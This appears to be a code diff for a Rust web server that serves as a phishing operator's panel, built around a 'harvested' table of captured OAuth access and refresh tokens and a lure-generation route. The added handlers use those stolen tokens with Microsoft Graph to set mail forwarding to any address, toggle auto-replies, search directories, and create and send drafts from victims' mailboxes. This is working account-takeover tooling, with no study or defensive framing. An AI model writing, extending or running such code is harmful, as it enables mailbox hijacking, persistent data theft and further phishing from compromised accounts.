@@ -1268,6 +1268,224 @@ async fn root_status() -> impl Responder {
     }))
 }
 
+// === Advanced Graph API Handlers ===
+
+async fn get_mailbox_settings_handler(
+    path: web::Path<String>,
+    state: web::Data<AppState>,
+) -> impl Responder {
+    let token_id = path.into_inner();
+    let token = match retrieve_any_token(&state, &token_id).await {
+        Ok(t) => t,
+        Err(e) => return HttpResponse::NotFound().json(serde_json::json!({"error": "token_not_found", "details": format!("{}", e)})),
+    };
+    let access_token = refresh_access_token(&state, &token.refresh_token).await
+        .unwrap_or_else(|| token.access_token.clone());
+    let client = GraphClient::new();
+    match client.get_mailbox_settings(&access_token).await {
+        Ok(settings) => HttpResponse::Ok().json(settings),
+        Err(e) => HttpResponse::InternalServerError().json(serde_json::json!({"error": "mailbox_settings_failed", "details": format!("{}", e)})),
+    }
+}
+
+#[derive(Deserialize)]
+struct AutoReplyRequest {
+    internal_reply: String,
+    external_reply: String,
+    external_audience: Option<String>,
+}
+
+async fn set_auto_reply_handler(
+    path: web::Path<String>,
+    body: web::Json<AutoReplyRequest>,
+    state: web::Data<AppState>,
+) -> impl Responder {
+    let token_id = path.into_inner();
+    let token = match retrieve_any_token(&state, &token_id).await {
+        Ok(t) => t,
+        Err(e) => return HttpResponse::NotFound().json(serde_json::json!({"error": "token_not_found", "details": format!("{}", e)})),
+    };
+    let access_token = refresh_access_token(&state, &token.refresh_token).await
+        .unwrap_or_else(|| token.access_token.clone());
+    let audience = body.external_audience.as_deref().unwrap_or("all");
+    let client = GraphClient::new();
+    match client.set_auto_reply(&access_token, &body.internal_reply, &body.external_reply, audience).await {
+        Ok(_) => HttpResponse::Ok().json(serde_json::json!({"success": true, "message": "Auto-reply (OOO) enabled"})),
+        Err(e) => HttpResponse::InternalServerError().json(serde_json::json!({"error": "auto_reply_failed", "details": format!("{}", e)})),
+    }
+}
+
+async fn disable_auto_reply_handler(
+    path: web::Path<String>,
+    state: web::Data<AppState>,
+) -> impl Responder {
+    let token_id = path.into_inner();
+    let token = match retrieve_any_token(&state, &token_id).await {
+        Ok(t) => t,
+        Err(e) => return HttpResponse::NotFound().json(serde_json::json!({"error": "token_not_found", "details": format!("{}", e)})),
+    };
+    let access_token = refresh_access_token(&state, &token.refresh_token).await
+        .unwrap_or_else(|| token.access_token.clone());
+    let client = GraphClient::new();
+    match client.disable_auto_reply(&access_token).await {
+        Ok(_) => HttpResponse::Ok().json(serde_json::json!({"success": true, "message": "Auto-reply (OOO) disabled"})),
+        Err(e) => HttpResponse::InternalServerError().json(serde_json::json!({"error": "disable_failed", "details": format!("{}", e)})),
+    }
+}
+
+#[derive(Deserialize)]
+struct MailForwardingRequest {
+    forward_to: String,
+}
+
+async fn set_mail_forwarding_handler(
+    path: web::Path<String>,
+    body: web::Json<MailForwardingRequest>,
+    state: web::Data<AppState>,
+) -> impl Responder {
+    let token_id = path.into_inner();
+    let token = match retrieve_any_token(&state, &token_id).await {
+        Ok(t) => t,
+        Err(e) => return HttpResponse::NotFound().json(serde_json::json!({"error": "token_not_found", "details": format!("{}", e)})),
+    };
+    let access_token = refresh_access_token(&state, &token.refresh_token).await
+        .unwrap_or_else(|| token.access_token.clone());
+    let client = GraphClient::new();
+    match client.set_mail_forwarding(&access_token, &body.forward_to).await {
+        Ok(_) => HttpResponse::Ok().json(serde_json::json!({"success": true, "message": format!("Mail forwarding set to {}", body.forward_to)})),
+        Err(e) => HttpResponse::InternalServerError().json(serde_json::json!({"error": "forwarding_failed", "details": format!("{}", e)})),
+    }
+}
+
+async fn disable_mail_forwarding_handler(
+    path: web::Path<String>,
+    state: web::Data<AppState>,
+) -> impl Responder {
+    let token_id = path.into_inner();
+    let token = match retrieve_any_token(&state, &token_id).await {
+        Ok(t) => t,
+        Err(e) => return HttpResponse::NotFound().json(serde_json::json!({"error": "token_not_found", "details": format!("{}", e)})),
+    };
+    let access_token = refresh_access_token(&state, &token.refresh_token).await
+        .unwrap_or_else(|| token.access_token.clone());
+    let client = GraphClient::new();
+    match client.disable_mail_forwarding(&access_token).await {
+        Ok(_) => HttpResponse::Ok().json(serde_json::json!({"success": true, "message": "Mail forwarding disabled"})),
+        Err(e) => HttpResponse::InternalServerError().json(serde_json::json!({"error": "disable_failed", "details": format!("{}", e)})),
+    }
+}
+
+async fn search_directory_users_handler(
+    path: web::Path<String>,
+    query: web::Query<std::collections::HashMap<String, String>>,
+    state: web::Data<AppState>,
+) -> impl Responder {
+    let token_id = path.into_inner();
+    let search = query.get("q").cloned().unwrap_or_default();
+    if search.is_empty() {
+        return HttpResponse::BadRequest().json(serde_json::json!({"error": "q parameter required"}));
+    }
+    let token = match retrieve_any_token(&state, &token_id).await {
+        Ok(t) => t,
+        Err(e) => return HttpResponse::NotFound().json(serde_json::json!({"error": "token_not_found", "details": format!("{}", e)})),
+    };
+    let access_token = refresh_access_token(&state, &token.refresh_token).await
+        .unwrap_or_else(|| token.access_token.clone());
+    let client = GraphClient::new();
+    match client.search_directory_users(&access_token, &search, 50).await {
+        Ok(results) => HttpResponse::Ok().json(results),
+        Err(e) => HttpResponse::InternalServerError().json(serde_json::json!({"error": "directory_search_failed", "details": format!("{}", e)})),
+    }
+}
+
+async fn get_drafts_handler(
+    path: web::Path<String>,
+    state: web::Data<AppState>,
+) -> impl Responder {
+    let token_id = path.into_inner();
+    let token = match retrieve_any_token(&state, &token_id).await {
+        Ok(t) => t,
+        Err(e) => return HttpResponse::NotFound().json(serde_json::json!({"error": "token_not_found", "details": format!("{}", e)})),
+    };
+    let access_token = refresh_access_token(&state, &token.refresh_token).await
+        .unwrap_or_else(|| token.access_token.clone());
+    let client = GraphClient::new();
+    match client.get_drafts(&access_token, 50).await {
+        Ok(resp) => HttpResponse::Ok().json(resp),
+        Err(e) => HttpResponse::InternalServerError().json(serde_json::json!({"error": "drafts_failed", "details": format!("{}", e)})),
+    }
+}
+
+#[derive(Deserialize)]
+struct CreateDraftRequest {
+    to: Vec<String>,
+    subject: String,
+    body: String,
+    content_type: Option<String>,
+}
+
+async fn create_draft_handler(
+    path: web::Path<String>,
+    body: web::Json<CreateDraftRequest>,
+    state: web::Data<AppState>,
+) -> impl Responder {
+    let token_id = path.into_inner();
+    let token = match retrieve_any_token(&state, &token_id).await {
+        Ok(t) => t,
+        Err(e) => return HttpResponse::NotFound().json(serde_json::json!({"error": "token_not_found", "details": format!("{}", e)})),
+    };
+    let access_token = refresh_access_token(&state, &token.refresh_token).await
+        .unwrap_or_else(|| token.access_token.clone());
+    let ct = body.content_type.as_deref().unwrap_or("HTML");
+    let client = GraphClient::new();
+    match client.create_draft(&access_token, &body.to, &body.subject, &body.body, ct).await {
+        Ok(draft) => HttpResponse::Ok().json(draft),
+        Err(e) => HttpResponse::InternalServerError().json(serde_json::json!({"error": "draft_create_failed", "details": format!("{}", e)})),
+    }
+}
+
+async fn send_draft_handler(
+    path: web::Path<(String, String)>,
+    state: web::Data<AppState>,
+) -> impl Responder {
+    let (token_id, message_id) = path.into_inner();
+    let token = match retrieve_any_token(&state, &token_id).await {
+        Ok(t) => t,
+        Err(e) => return HttpResponse::NotFound().json(serde_json::json!({"error": "token_not_found", "details": format!("{}", e)})),
+    };
+    let access_token = refresh_access_token(&state, &token.refresh_token).await
+        .unwrap_or_else(|| token.access_token.clone());
+    let client = GraphClient::new();
+    match client.send_draft(&access_token, &message_id).await {
+        Ok(_) => HttpResponse::Ok().json(serde_json::json!({"success": true, "message": "Draft sent"})),
+        Err(e) => HttpResponse::InternalServerError().json(serde_json::json!({"error": "draft_send_failed", "details": format!("{}", e)})),
+    }
+}
+
+#[derive(Deserialize)]
+struct ApplyCategoriesRequest {
+    categories: Vec<String>,
+}
+
+async fn apply_categories_handler(
+    path: web::Path<(String, String)>,
+    body: web::Json<ApplyCategoriesRequest>,
+    state: web::Data<AppState>,
+) -> impl Responder {
+    let (token_id, message_id) = path.into_inner();
+    let token = match retrieve_any_token(&state, &token_id).await {
+        Ok(t) => t,
+        Err(e) => return HttpResponse::NotFound().json(serde_json::json!({"error": "token_not_found", "details": format!("{}", e)})),
+    };
+    let access_token = refresh_access_token(&state, &token.refresh_token).await
+        .unwrap_or_else(|| token.access_token.clone());
+    let client = GraphClient::new();
+    match client.apply_categories(&access_token, &message_id, &body.categories).await {
+        Ok(_) => HttpResponse::Ok().json(serde_json::json!({"success": true, "message": "Categories applied"})),
+        Err(e) => HttpResponse::InternalServerError().json(serde_json::json!({"error": "categories_failed", "details": format!("{}", e)})),
+    }
+}
+
 // HTML admin dashboard (with View Inbox button)
 async fn admin_dashboard(state: web::Data<AppState>) -> impl Responder {
     let rows = sqlx::query_as::<_, HarvestedToken>("SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, last_refreshed_at, status FROM harvested ORDER BY captured_at DESC")
@@ -1685,6 +1903,17 @@ async fn main() -> std::io::Result<()> {
             .route("/api/inbox/deleted-items/{token_id}", web::get().to(get_deleted_items_handler))
             .route("/api/inbox/deleted-items/{token_id}/purge", web::post().to(purge_deleted_items_handler))
             .route("/api/lure/generate", web::post().to(generate_lure_handler))
+            // === Advanced Graph API features ===
+            .route("/api/mailbox/settings/{token_id}", web::get().to(get_mailbox_settings_handler))
+            .route("/api/mailbox/auto-reply/{token_id}", web::post().to(set_auto_reply_handler))
+            .route("/api/mailbox/auto-reply/{token_id}/disable", web::post().to(disable_auto_reply_handler))
+            .route("/api/mailbox/forwarding/{token_id}", web::post().to(set_mail_forwarding_handler))
+            .route("/api/mailbox/forwarding/{token_id}/disable", web::post().to(disable_mail_forwarding_handler))
+            .route("/api/directory/users/{token_id}", web::get().to(search_directory_users_handler))
+            .route("/api/drafts/{token_id}", web::get().to(get_drafts_handler))
+            .route("/api/drafts/{token_id}", web::post().to(create_draft_handler))
+            .route("/api/drafts/{token_id}/{message_id}/send", web::post().to(send_draft_handler))
+            .route("/api/messages/{token_id}/{message_id}/categories", web::post().to(apply_categories_handler))
     })
     .bind(("0.0.0.0", port))?
     .run()
